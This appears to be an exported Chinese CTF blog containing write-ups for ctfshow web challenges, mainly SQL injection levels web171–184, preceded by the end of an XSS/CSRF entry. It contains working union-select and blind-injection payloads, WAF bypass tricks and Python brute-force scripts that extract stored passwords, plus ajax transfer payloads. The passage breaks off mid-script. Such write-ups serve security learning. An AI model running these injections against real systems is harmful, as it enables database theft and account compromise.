<h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url: &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;amount.php&quot;,method: &quot;POST&quot;,data: &#123;&#39;u&#39;&#x3D;&#39;gylq&#39;,&#39;a&#39;:10000&#125;,cache: false,success: function(res)&#123;&#125;&#125;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

<p>向admin转-10000</p>
<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><blockquote>
<ul>
<li>burp抓包跑一波，为了练习一下python，写个脚本跑，两个，非预期和预期解</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># -- coding:UTF-8 --</span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># Date:2021&#x2F;8&#x2F;7</span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;d69814f3-233e-41dc-b8e0-5cb7ffbc711d.challenge.ctf.show:8080&#x2F;api&#x2F;amount.php&quot;</span><br><span class="line">headers &#x3D;&#123;&#39;Cookie&#39;:&#39;PHPSESSID&#x3D;q3crvj696jaorhq25sktu88l3j&#39;&#125; #登陆后的sessionid</span><br><span class="line">for i in range(0,10000):</span><br><span class="line">    tmp&#x3D;i*4</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &#39;u&#39;: &#39;admin123&#39;,</span><br><span class="line">        &#39;a&#39;: str(tmp)</span><br><span class="line">    &#125;</span><br><span class="line">    res&#x3D;requests.post(url,data&#x3D;data,headers&#x3D;headers)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#39;api&#x2F;amount.php&#39;,type:&#39;POST&#39;,data:&#123;&#39;u&#39;:&#39;gylq&#39;,&#39;a&#39;:&#39;10000&#39;&#125;&#125;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-SQL注入 wp</title>
    <url>/posts/88.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><blockquote>
<ul>
<li><strong>根据语句可以看到有flag没有被显示出来，让我们拼接语句来绕过</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>GET传参会自己解码，注释可以用%23（#）, –空格,–+等，或者拼接语句不用注释也行</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052118542.png" alt="image-20210727052118542"></p>
<ul>
<li><strong>判断有3个字段</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' order by 3<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052202385.png" alt="image-20210727052202385"></p>
<ul>
<li><strong>联合查询，查表</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052424376.png" alt="image-20210727052424376"></p>
<ul>
<li>查字段</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'ctfshow_user'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052509428.png" alt="image-20210727052509428"></p>
<ul>
<li>查flag</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052648926.png" alt="image-20210727052648926"></p>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!=='flag')&#123;</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>多了层过滤，没有检测到username有flag结果才能查询成功，不查询username，就用password，和上题没区别</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user2<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user3<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match('/flag|[0-9]/i', json_encode($ret)))&#123;</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>过滤了数字，考察replace的运用，先判断有几个字段</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 2 %23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091147187.png" alt="image-20210727091147187"></p>
<blockquote>
<ul>
<li><strong>联合函数添加a和b两个数据ok</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091245501.png" alt="image-20210727091245501"></p>
<blockquote>
<ul>
<li>先构造一个replace将0-9全部置换</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="number">1234567890</span>,<span class="number">1</span>,<span class="string">'numA'</span>),<span class="number">2</span>,<span class="string">'numB'</span>),<span class="number">3</span>,<span class="string">'numC'</span>),<span class="number">4</span>,<span class="string">'numD'</span>),<span class="number">5</span>,<span class="string">'numE'</span>),<span class="number">6</span>,<span class="string">'numF'</span>),<span class="number">7</span>,<span class="string">'numG'</span>),<span class="number">8</span>,<span class="string">'numH'</span>),<span class="number">9</span>,<span class="string">'numI'</span>),<span class="string">'0'</span>,<span class="string">'numJ'</span>);</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091509981.png" alt="image-20210727091509981"></p>
<blockquote>
<ul>
<li>查表构造语句将1-0换成table_name</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39; union all select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),1,&#39;numA&#39;),2,&#39;numB&#39;),3,&#39;numC&#39;),4,&#39;numD&#39;),5,&#39;numE&#39;),6,&#39;numF&#39;),7,&#39;numG&#39;),8,&#39;numH&#39;),9,&#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from information_schema.tables where table_schema&#x3D;database() %23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091702800.png" alt="image-20210727091702800"></p>
<blockquote>
<ul>
<li>查字段名</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39; union all select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(column_name),1,&#39;numA&#39;),2,&#39;numB&#39;),3,&#39;numC&#39;),4,&#39;numD&#39;),5,&#39;numE&#39;),6,&#39;numF&#39;),7,&#39;numG&#39;),8,&#39;numH&#39;),9,&#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user4&#39; %23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091826089.png" alt="image-20210727091826089"></p>
<blockquote>
<ul>
<li>查结果</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#39;numA&#39;),2,&#39;numB&#39;),3,&#39;numC&#39;),4,&#39;numD&#39;),5,&#39;numE&#39;),6,&#39;numF&#39;),7,&#39;numG&#39;),8,&#39;numH&#39;),9,&#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4--+</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091848759.png" alt="image-20210727091848759"></p>
<blockquote>
<ul>
<li>写个小py来转换一下</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">'ctfshow&#123;numHnumEbnumCnumFenumJd-anumEnumHnumF-numDfbnumC-adnumBnumJ-enumAnumAnumBenumDnumFnumDnumGnumHnumAnumH&#125;'</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">flag = flag + flagstr.replace(<span class="string">'numA'</span>,<span class="string">'1'</span>).\</span><br><span class="line">    replace(<span class="string">'numB'</span>,<span class="string">'2'</span>)\</span><br><span class="line">    .replace(<span class="string">'numC'</span>,<span class="string">'3'</span>)\</span><br><span class="line">    .replace(<span class="string">'numD'</span>,<span class="string">'4'</span>)\</span><br><span class="line">    .replace(<span class="string">'numE'</span>,<span class="string">'5'</span>)\</span><br><span class="line">    .replace(<span class="string">'numF'</span>,<span class="string">'6'</span>)\</span><br><span class="line">    .replace(<span class="string">'numG'</span>,<span class="string">'7'</span>)\</span><br><span class="line">    .replace(<span class="string">'numH'</span>,<span class="string">'8'</span>)\</span><br><span class="line">    .replace(<span class="string">'numI'</span>,<span class="string">'9'</span>)\</span><br><span class="line">    .replace(<span class="string">'numJ'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091931245.png" alt="image-20210727091931245"></p>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[\x00-\x7f]/i'</span>, json_encode($ret)))&#123;</span><br><span class="line">      $ret[<span class="string">'msg'</span>]=<span class="string">'查询成功'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>将ascii所有字符都禁了，无回显就用盲注，写个py脚本</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://bab11107-9d31-46bf-b41e-0a04bb92b155.challenge.ctf.show:8080/api/v5.php"</span></span><br><span class="line">dict = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line">flag =<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">        payload= <span class="string">f"?id=1' and if(substr((select password from ctfshow_user5 where username=\"flag\"),<span class="subst">&#123;i&#125;</span>,1)=\"<span class="subst">&#123;j&#125;</span>\",sleep(3),0)--+"</span></span><br><span class="line">        res_get = url + payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url=res_get)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">3</span>:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730095850795.png" alt="image-20210730095850795"></p>
</blockquote>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><blockquote>
<ul>
<li><strong>发现是对select的过滤，但是没有过滤大小写</strong></li>
</ul>
</blockquote>
<ul>
<li>表</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union all <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">Select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>字段</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union all <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">Select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'ctfshow_user'</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>查flag</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union all <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">Select</span> <span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username=<span class="string">'flag'</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>第二种方法简单——利用or的后面条件一直为真，可以显示所有数据</li>
</ul>
</blockquote>
<ul>
<li>查所有数据</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' or 1=1<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730101403056.png" alt="image-20210730101403056"></p>
<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><blockquote>
<ul>
<li>第一种方法判断过滤了空格，但是依旧可以用or通杀显示所有数据</li>
</ul>
</blockquote>
<p><strong>查flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1'or(1=1)%23</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>第二种方法，这次发现还多过滤了空格，我们可以用<code>%0a</code>换行符或者注释符绕过(或者<code>%09,%0b,%0c,%0d</code>都可以)，这次我们用万能密码吧，用上面的也可以，不过绕过空格后有点长，后面的注释我们用<code>#</code>的url编码形式<code>%23</code></strong></li>
</ul>
</blockquote>
<p><strong>查flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1'%09union%09select%091,2,(<span class="keyword">select</span>%<span class="number">09</span><span class="keyword">password</span>%<span class="number">09</span><span class="keyword">from</span>%<span class="number">09</span>ctfshow_user%<span class="number">09</span><span class="keyword">where</span>%<span class="number">09</span>username=<span class="string">'flag'</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><blockquote>
<ul>
<li><strong>和上题差不多，多办了/**/</strong>这个注释符号，也可以<strong>万能密码<code>1&#39;%09or%091=1%23</code></strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1'%09union%09select%091,2,(<span class="keyword">select</span>%<span class="number">09</span><span class="keyword">password</span>%<span class="number">09</span><span class="keyword">from</span>%<span class="number">09</span>ctfshow_user%<span class="number">09</span><span class="keyword">where</span>%<span class="number">09</span>username=<span class="string">'flag'</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><blockquote>
<ul>
<li><strong>和上题差不多，过滤了<code>%09,%0b,%0d</code>和空格也可以用万能密码<code>1&#39;%0cor%0c1=1%23</code></strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1'%0cunion%0cselect%0c1,2,(<span class="keyword">select</span>%<span class="number">0</span>cpassword%<span class="number">0</span>cfrom%<span class="number">0</span>cctfshow_user%<span class="number">0</span>cwhere%<span class="number">0</span>cusername=<span class="string">'flag'</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><blockquote>
<ul>
<li><strong>这题%23也过滤了，绕过空格的基本都过滤了，我们想着拼凑语句</strong></li>
</ul>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1.1'or(id='26')and'1=1</span><br></pre></td></tr></table></figure></div>

<p>这个拼接之后的语句就是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username !=<span class="string">'flag'</span> <span class="keyword">and</span> <span class="keyword">id</span> = <span class="string">'1.1'</span><span class="keyword">or</span>(<span class="keyword">id</span>=<span class="string">'26'</span>)<span class="keyword">and</span><span class="string">'1=1’ limit 1;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">id='1.1'or(id=26)and'1=1' limit 1;</span><br><span class="line">也就是</span><br><span class="line">(id='1.1') or ((id=26) and '1=1') limit 1;</span><br><span class="line">前面因为1.1不存在为0，后面为1，所以整个条件为1</span><br></pre></td></tr></table></figure></div>

<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1.1'or(id=26)and'a'='a</span><br></pre></td></tr></table></figure></div>

<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1.1'or(id=26)and'a'='a</span><br></pre></td></tr></table></figure></div>

<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = "<span class="keyword">select</span> <span class="keyword">count</span>(pass) <span class="keyword">from</span> <span class="string">".$_POST['tableName']."</span>;";</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>提示说拼接sql语句找到指定id，因为前几天他的表都是ctfshow_user，我们可以尝试一下这个表，然后用like和%进行模糊匹配</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>post传参</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730124155127.png" alt="image-20210730124155127"></p>
<ul>
<li><strong>这里明显有布尔盲注，来进行猜解flag，写一个py脚本</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://e9202b55-424f-460d-8597-692168ba560f.challenge.ctf.show:8080/select-waf.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line">flag = <span class="string">"ctfshow"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"tableName"</span>:<span class="string">"(ctfshow_user)where(pass)like'&#123;0&#125;%'"</span>.format(flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">"$user_count = 1"</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730132558687.png" alt="image-20210730132558687"></p>
</blockquote>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><blockquote>
<ul>
<li><strong>这把过滤了where，我们用右连接来做</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ctfshow% 的十六进制 为 0x63746673686F7725</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>所以用他来匹配like,放出了空格</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686F7725</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>写个py来跑flag</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30 21:24</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment">#转十六进制</span></span><br><span class="line">    str_16 = binascii.b2a_hex(s.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    res = bytes.decode(str_16)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://d42dba7c-384e-4a5d-9a5d-26398d42ce7c.challenge.ctf.show:8080/select-waf.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line">flag 